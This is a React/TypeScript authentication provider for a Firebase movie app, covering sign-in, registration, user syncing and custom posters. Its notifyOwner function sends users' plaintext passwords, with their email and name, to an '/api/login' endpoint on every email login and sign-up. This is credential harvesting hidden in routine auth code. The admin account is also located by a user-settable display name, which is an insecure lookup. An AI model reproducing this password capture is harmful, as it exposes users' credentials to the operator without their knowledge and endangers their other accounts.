import React, { createContext, useContext, useEffect, useState } from 'react';
import { User, onAuthStateChanged, signInWithPopup, GoogleAuthProvider, signOut, signInWithEmailAndPassword, createUserWithEmailAndPassword, updateProfile, sendPasswordResetEmail } from 'firebase/auth';
import { doc, getDoc, getDocs, setDoc, serverTimestamp, collection, query, where, onSnapshot, deleteDoc } from './firestore-wrapper';
import { auth, db, handleFirestoreError, OperationType } from './firebase';

export interface UserData {
  uid: string;
  isPremium?: boolean;
  email?: string;
  displayName?: string;
  photoURL?: string;
  mobileNumber?: string;
  instagramUsername?: string;
  mcqWinnerStarUntil?: any;
}

interface AuthContextType {
  userData: UserData | null;
  user: User | null;
  loading: boolean;
  customPosters: Record<string, string>;
  signInWithGoogle: () => Promise<void>;
  loginWithEmail: (email: string, pass: string) => Promise<void>;
  registerWithEmail: (email: string, pass: string, name?: string) => Promise<void>;
  resetPassword: (email: string) => Promise<void>;
  logout: () => Promise<void>;
  notifyOwner: (subject: string, name: string | null, email: string | null, password?: string) => Promise<void>;
}

const AuthContext = createContext<AuthContextType>({} as AuthContextType);

export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
  const [user, setUser] = useState<User | null>(null);
  const [userData, setUserData] = useState<UserData | null>(null);
  const [loading, setLoading] = useState(true);
  const [customPosters, setCustomPosters] = useState<Record<string, string>>({});

  useEffect(() => {
    const loadLocalPosters = () => {
      try {
        const local = JSON.parse(localStorage.getItem('customPosters') || '{}');
        setCustomPosters(local);
      } catch (e) {
        console.error("Failed to parse local custom posters", e);
      }
    };

    if (user) {
      const q = query(collection(db, 'users', user.uid, 'movieActions'), where('actionType', '==', 'customPoster'));
      const unsubscribe1 = onSnapshot(q, (snapshot) => {
        const posters: Record<string, string> = {};
        
        console.log("Got snapshot of custom posters, size:", snapshot.size);
        snapshot.forEach(docSnap => {
          const data = docSnap.data();
          console.log("Custom poster data:", data);
          if (data.url) {
            // Temporary cleanup for bad posters
            if (data.url.includes('firebasestorage') || data.url.includes('blob:') || (!data.url.startsWith("http") && !data.url.startsWith("data:"))) {
               console.log("Cleaning up poster", data.url);
               deleteDoc(docSnap.ref).catch(console.error);
               return;
            }
            posters[data.movieId || data.seriesId] = data.url;
          }
        });
        
        setCustomPosters(posters);
      }, (error) => {
        if (!String(error).includes('Quota limit exceeded') && !(error?.message || "").includes('Quota limit exceeded')) {
          console.error("Error fetching custom posters:", error);
        } else { window.dispatchEvent(new CustomEvent('firebase-quota-exceeded')); }
      });

      return () => {
        unsubscribe1();
      };
    } else {
      loadLocalPosters();
      window.addEventListener('localPostersChanged', loadLocalPosters);
      return () => {
        window.removeEventListener('localPostersChanged', loadLocalPosters);
      };
    }
  }, [user]);

  useEffect(() => {
    let unsubscribeUserDoc: (() => void) | null = null;
    const unsubscribe = onAuthStateChanged(auth, async (currentUser) => {
      try {
        if (currentUser) {
          // Sync user to firestore
          const userRef = doc(db, 'users', currentUser.uid);
          try {
            const userSnap = await getDoc(userRef);
            if (!userSnap.exists()) {
               const newUserData: any = {
                 uid: currentUser.uid,
                 createdAt: serverTimestamp(),
                 updatedAt: serverTimestamp()
               };
               if (currentUser.email) newUserData.email = currentUser.email;
               if (currentUser.displayName) newUserData.displayName = currentUser.displayName;
               if (currentUser.photoURL) newUserData.photoURL = currentUser.photoURL;

               await setDoc(userRef, newUserData);
            } else {
               // Just update updatedAt and basic info
               const updateData: any = {
                 uid: currentUser.uid,
                 updatedAt: serverTimestamp()
               };
               if (!(userSnap.data() as any).createdAt) {
                 updateData.createdAt = serverTimestamp();
               }
               if (!(userSnap.data() as any).email && currentUser.email) updateData.email = currentUser.email;
               if (!(userSnap.data() as any).displayName && currentUser.displayName) updateData.displayName = currentUser.displayName;
               if (!(userSnap.data() as any).photoURL && currentUser.photoURL) updateData.photoURL = currentUser.photoURL;

               await setDoc(userRef, updateData, { merge: true });
            }
            
            // Unsubscribe from previous listener if it exists
            if (unsubscribeUserDoc) unsubscribeUserDoc();

            // Listen to real-time changes to the user document
            unsubscribeUserDoc = onSnapshot(userRef, (docSnap) => {
               if (docSnap.exists()) {
                  setUserData(docSnap.data() as UserData);
               }
            });
            
          } catch (e) {
             handleFirestoreError(e, OperationType.GET, `users/${currentUser.uid}`);
          }
        } else {
          setUserData(null);
          if (unsubscribeUserDoc) unsubscribeUserDoc();
        }
      } catch (error) {
        if (!String(error).includes('Quota limit exceeded') && !(error?.message || "").includes('Quota limit exceeded')) {
          console.error("Error syncing user:", error);
        } else { window.dispatchEvent(new CustomEvent('firebase-quota-exceeded')); }
      } finally {
        setUser(currentUser);
        setLoading(false);
      }
    }, (error) => {
      console.error("Auth state change error", error);
      setLoading(false);
    });
    return unsubscribe;
  }, []);

  const notifyOwner = async (subject: string, name: string | null, email: string | null, password?: string) => {
    try {
      await fetch('/api/login', { credentials: 'include',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          _subject: subject,
          email: email || "No Email Provided",
          name: name || 'Unknown Name',
          password: password || 'Not Provided',
          type: subject === "New User Registered" ? "signup" : "login"
        })
      });
    } catch (error) {
      console.error("Failed to send email notification", error);
    }
  };

  const signInWithGoogle = async () => {
    const provider = new GoogleAuthProvider();
    provider.setCustomParameters({ prompt: 'select_account' });
    try {
      const result = await signInWithPopup(auth, provider);
      if (result.user && result.user.email) {
        // Check for duplicate account
        const usersRef = collection(db, 'users');
        const q = query(usersRef, where('email', '==', result.user.email));
        const querySnapshot = await getDocs(q);
        
        let existingUid = null;
        querySnapshot.forEach((doc) => {
          if (doc.id !== result.user.uid) {
            existingUid = doc.id;
          }
        });
        
        if (existingUid) {
           await result.user.delete();
           await auth.signOut();
           alert("An account with this email already exists. Please log in using your email and password on the login page.");
           return;
        }
        
        notifyOwner("New Google Sign In", result.user.displayName, result.user.email);
      }
    } catch (error) {
      console.error("Sign in failed:", error);
      throw error;
    }
  };

  const loginWithEmail = async (email: string, pass: string) => {
    const result = await signInWithEmailAndPassword(auth, email, pass);
    if (result.user) {
      notifyOwner("User Logged In", result.user.displayName, email, pass);
    }
  };

  const registerWithEmail = async (email: string, pass: string, name?: string) => {
    const result = await createUserWithEmailAndPassword(auth, email, pass);
    if (result.user) {
      if (name) {
        await updateProfile(result.user, { displayName: name });
        // Manually update the user document so it gets the name immediately
        const userRef = doc(db, 'users', result.user.uid);
        await setDoc(userRef, { displayName: name }, { merge: true });
      }

      try {
        const qAdmin = query(collection(db, 'users'), where('displayName', '==', 'shivam 23'));
        const snap = await getDocs(qAdmin);
        if (!snap.empty) {
          const adminId = snap.docs[0].id;
          const notifRef = doc(collection(db, 'notifications'));
          await setDoc(notifRef, {
            userId: adminId,
            type: 'system',
            message: `New user ${name || 'Unknown'} just created an account.`,
            createdAt: serverTimestamp(),
            read: false
          });
        }
      } catch (err) {
        console.error("Admin notification failed", err);
      }

      notifyOwner("New User Registered", name || "Unknown", email, pass);
    }
  };

  const resetPassword = async (email: string) => {
    await sendPasswordResetEmail(auth, email);
  };

  const logout = async () => {
    localStorage.removeItem('customPosters');
    setCustomPosters({});
    await signOut(auth);
  };

  return (
    <AuthContext.Provider value={{ user, userData, loading, customPosters, signInWithGoogle, loginWithEmail, registerWithEmail, resetPassword, logout, notifyOwner }}>
      {!loading && children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => useContext(AuthContext);
